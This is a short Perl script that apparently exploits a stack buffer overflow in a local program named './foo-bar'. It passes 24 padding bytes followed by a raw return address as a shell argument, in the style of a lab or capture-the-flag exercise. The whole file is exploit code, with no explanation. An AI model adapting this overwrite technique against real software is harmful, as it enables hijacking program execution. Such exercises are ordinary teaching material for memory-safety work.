#!/usr/bin/env perl

use strict;

my $arg = "ABCDEFGHIJKLMNOPQRSTUVWX"."\xf4\x05\x40";
my $cmd = "./foo-bar ".$arg;

system($cmd);
